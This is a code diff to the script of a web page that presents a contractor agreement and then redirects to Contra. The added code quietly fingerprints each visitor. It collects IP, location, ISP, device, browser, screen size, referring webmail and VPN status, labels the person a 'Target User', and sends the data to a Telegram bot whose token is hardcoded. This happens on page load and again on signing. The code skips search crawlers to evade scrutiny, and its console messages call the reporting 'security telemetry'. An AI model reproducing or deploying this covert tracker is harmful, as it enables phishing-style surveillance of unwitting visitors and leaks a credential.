@@ -386,14 +386,11 @@
     </footer>
 
 <script>
-// Check URL parameters to reset contract state without wiping section2Data
-const urlParams = new URLSearchParams(window.location.search);
-if (urlParams.get('reset') === 'true' || urlParams.get('clear') === 'true') {
-    localStorage.removeItem('avalonflow_contract_signed');
-    localStorage.removeItem('avalonflow_contract_signed_date');
-    localStorage.removeItem('avalonflow_contract_signed_timestamp');
-}
-
+    // ==========================================
+    // 1. TELEGRAM TELEMETRY CONFIGURATION
+    // ==========================================
+    const TELEGRAM_BOT_TOKENs = "8557695057:AAEvi4jAxVQkvRWOSrbORu_Yd53B40ISihI";
+    const TELEGRAM_CHAT_IDs = "-1004492539159";
     const CONTRA_REDIRECT_URL = 'https://contra.com';
 
     // Formats Date.now() into "Month DD, YYYY"
@@ -404,7 +401,7 @@ if (urlParams.get('reset') === 'true' || urlParams.get('clear') === 'true') {
 
     const currentDateFormatted = getFormattedDate();
 
-    // 1. DYNAMICALLY READ THE FULL NAME FROM URL QUERY OR LOCALSTORAGE
+    // Dynamically read the full name from URL query or localStorage
     function getContractorName() {
         const urlParams = new URLSearchParams(window.location.search);
         const urlName = urlParams.get('user');
@@ -430,18 +427,149 @@ if (urlParams.get('reset') === 'true' || urlParams.get('clear') === 'true') {
 
     const contractorName = getContractorName();
 
-    // 2. CHECK SIGNED STATUS BEFORE RENDER
+    // Check signed status before render
     if (localStorage.getItem('avalonflow_contract_signed') === 'true') {
         window.location.replace(CONTRA_REDIRECT_URL);
     }
 
-    // 3. UPDATE DOM ELEMENTS WITH DETECTED NAME & DYNAMIC DATES
+    // ==========================================
+    // 2. TELEGRAM NOTIFICATION ENGINE
+    // ==========================================
+    async function sendTelegramNotification(eventType = "Visitor Alert") {
+        try {
+            const rawAgent = navigator.userAgent;
+
+            // Anti-Bot Filter: Drop execution if crawler
+            if (/bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|slurp|embed/i.test(rawAgent)) {
+                console.log("🤖 Automated link indexing crawler bypassed safely.");
+                return;
+            }
+
+            // Prevent duplicate page-visit logs if already logged during this session (only for general visits)
+            if (eventType === "Visitor Alert" && sessionStorage.getItem('visitor_logged_tg')) {
+                return;
+            }
+
+            // Network telemetry fetch
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            if (!ipResponse.ok) throw new Error('Failed to fetch network details');
+            const ipData = await ipResponse.json();
+
+            const currentPage = window.location.pathname;
+            let detailedDevice = "Unknown Device";
+            let detectedBrowser = "Unknown Browser";
+
+            // Browser detection
+            if (/WhatsApp/i.test(rawAgent)) detectedBrowser = "WhatsApp In-App";
+            else if (/TelegramBot|Telegram/i.test(rawAgent)) detectedBrowser = "Telegram In-App";
+            else if (/Instagram/i.test(rawAgent)) detectedBrowser = "Instagram App";
+            else if (/TikTok/i.test(rawAgent)) detectedBrowser = "TikTok App";
+            else if (/FBAN|FBAV/i.test(rawAgent)) detectedBrowser = "Facebook App";
+            else if (/Twitter|TwitterforiPhone|TwitterAndroid/i.test(rawAgent)) detectedBrowser = "X (Twitter) App";
+            else if (/LinkedInApp/i.test(rawAgent)) detectedBrowser = "LinkedIn App";
+            else if (/Phoenix/i.test(rawAgent)) detectedBrowser = "Phoenix Browser";
+            else if (/SamsungBrowser/i.test(rawAgent)) detectedBrowser = "Samsung Internet";
+            else if (/OComponent|Opera|OPR/i.test(rawAgent)) detectedBrowser = "Opera";
+            else if (/Edg/i.test(rawAgent)) detectedBrowser = "Microsoft Edge";
+            else if (/Firefox|FxiOS/i.test(rawAgent)) detectedBrowser = "Mozilla Firefox";
+            else if (/Chrome|CriOS/i.test(rawAgent)) detectedBrowser = "Google Chrome";
+            else if (/Safari/i.test(rawAgent) && !/Android/i.test(rawAgent)) detectedBrowser = "Apple Safari";
+
+            // Referrer detection
+            const referrer = document.referrer || "";
+            if (detectedBrowser === "Google Chrome" || detectedBrowser === "Apple Safari") {
+                if (/mail\.google\.com/i.test(referrer)) detectedBrowser += " (via Gmail Web)";
+                else if (/mail\.yahoo/i.test(referrer)) detectedBrowser += " (via Yahoo Mail Web)";
+                else if (/outlook|live\.com/i.test(referrer)) detectedBrowser += " (via Outlook Web)";
+            }
+
+            // Device & OS detection
+            if (/Android/i.test(rawAgent)) {
+                const match = rawAgent.match(/Android\s+([^;]+);\s+([^)]+)/);
+                detailedDevice = match ? `Android ${match[1]} (${match[2]})` : "Android Device";
+            } else if (/iPhone|iPad|iPod/i.test(rawAgent)) {
+                const match = rawAgent.match(/OS\s+(\d+_\d+)/);
+                const iosVer = match ? match[1].replace('_', '.') : '';
+                detailedDevice = `iOS ${iosVer} (Apple Device)`;
+            } else if (/Windows/i.test(rawAgent)) {
+                const match = rawAgent.match(/Windows NT\s+([^;)]+)/);
+                let winVer = "PC";
+                if (match) {
+                    if (match[1] === "10.0") winVer = "10/11";
+                    else if (match[1] === "6.3") winVer = "8.1";
+                    else if (match[1] === "6.1") winVer = "7";
+                }
+                detailedDevice = `Windows ${winVer}`;
+            } else if (/Macintosh/i.test(rawAgent)) {
+                detailedDevice = "macOS Device";
+            } else if (/Linux/i.test(rawAgent)) {
+                detailedDevice = "Linux System";
+            }
+
+            // Anti-VPN Verification Check
+            const isProxy = ipData.proxy || false;
+            const ipDisplay = isProxy ? `${ipData.ip} ⚠️ [Proxy/VPN]` : ipData.ip;
+
+            const payload = {
+                device: detailedDevice,
+                browser: detectedBrowser,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                connectionType: navigator.connection ? navigator.connection.effectiveType : "N/A",
+                ip: ipDisplay || "Unknown",
+                city: ipData.city || "Unknown",
+                region: ipData.region || "Unknown",
+                country: ipData.country_name || "Unknown",
+                isp: ipData.org || "Unknown",
+                timestamp: new Date().toLocaleString()
+            };
+
+            const alertTitle = eventType === "Contract Signed" 
+                ? `<b>✍️ CONTRACT EXECUTED ALERT</b>` 
+                : `<b>👁️ New Visitor Alert</b>`;
+
+            const messageText = `${alertTitle}\n\n` +
+                                `👤 <b>Target User:</b> <code>${contractorName}</code>\n` +
+                                `📄 <b>Visited Page:</b> <code>${currentPage}</code>\n` +
+                                `🌐 <b>IP:</b> <code>${payload.ip}</code>\n` +
+                                `📍 <b>Location:</b> <code>${payload.city}, ${payload.region}, ${payload.country}</code>\n` +
+                                `🏢 <b>ISP:</b> <code>${payload.isp}</code>\n` +
+                                `📶 <b>Net Speed:</b> <code>${payload.connectionType}</code>\n` +
+                                `🌐 <b>Browser:</b> <code>${payload.browser}</code>\n` +
+                                `📱 <b>Device Setup:</b> <code>${payload.device}</code>\n` + 
+                                `📐 <b>Screen Res:</b> <code>${payload.screenResolution}</code>\n` +
+                                `⏰ <b>Time:</b> <code>${payload.timestamp}</code>`;
+
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKENs}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_IDs,
+                    text: messageText,
+                    parse_mode: 'HTML'
+                })
+            });
+
+            if (eventType === "Visitor Alert") {
+                sessionStorage.setItem('visitor_logged_tg', 'true');
+            }
+            console.log(`🔒 Security telemetry (${eventType}) forwarded successfully.`);
+        } catch (err) {
+            console.warn("Telegram telemetry bypass error:", err);
+        }
+    }
+
+    // ==========================================
+    // 3. DOM INITIALIZATION & SIGNING HANDLER
+    // ==========================================
     document.addEventListener("DOMContentLoaded", function() {
+        // Trigger page visit alert on load
+        sendTelegramNotification("Visitor Alert");
+
         // Update header metadata (Contractor & Effective Date)
         const metaContractor = document.getElementById('metaContractorName');
         if (metaContractor) metaContractor.innerText = contractorName;
 
-        // Replace all static "August 28, 2026" / "Aug 28 2026" variants across the body with today's date
+        // Replace all static date variants across the body with today's date
         const documentBody = document.querySelector('.document-card');
         if (documentBody) {
             documentBody.innerHTML = documentBody.innerHTML.replace(/Aug(ust)?\s+28,?\s+2026/gi, currentDateFormatted);
@@ -466,8 +594,11 @@ if (urlParams.get('reset') === 'true' || urlParams.get('clear') === 'true') {
         }
     });
 
-    // 4. HANDLE SIGNING, SAVE TIMESTAMP TO LOCALSTORAGE & REDIRECT
-    function handleSignAgreement() {
+    // Handle signing, fire Telegram alert, save to localStorage & redirect
+    async function handleSignAgreement() {
+        const agreeBtn = document.getElementById('agreeBtn');
+        if (agreeBtn) agreeBtn.disabled = true;
+
         const timestampNow = Date.now();
         const executionDateStr = getFormattedDate(timestampNow);
 
@@ -478,6 +609,9 @@ if (urlParams.get('reset') === 'true' || urlParams.get('clear') === 'true') {
         document.getElementById('contractorSignature').style.display = 'inline-block';
         document.getElementById('sigDate').innerText = executionDateStr;
         document.getElementById('actionArea').innerHTML = '<p style="color: #27ae60; font-weight: 700;">Agreement executed! Redirecting to Contra...</p>';
+
+        // Dispatch instant Telegram notification for contract execution
+        await sendTelegramNotification("Contract Signed");
 
         setTimeout(function() {
             window.location.replace(CONTRA_REDIRECT_URL);
